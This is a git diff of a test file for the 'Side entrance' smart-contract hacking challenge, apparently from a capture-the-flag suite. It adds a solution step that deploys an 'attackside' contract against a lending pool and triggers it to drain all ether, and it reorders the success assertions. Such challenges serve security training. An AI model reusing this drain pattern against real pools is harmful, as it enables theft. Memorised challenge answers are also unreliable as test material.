@@ -26,13 +26,16 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attack = await (await ethers.getContractFactory('attackside', player)).deploy(pool.address,ETHER_IN_POOL);
+        await attack.connect(player).attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player took all ETH from the pool
-        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
         expect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL);
+        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
+        
     });
 });
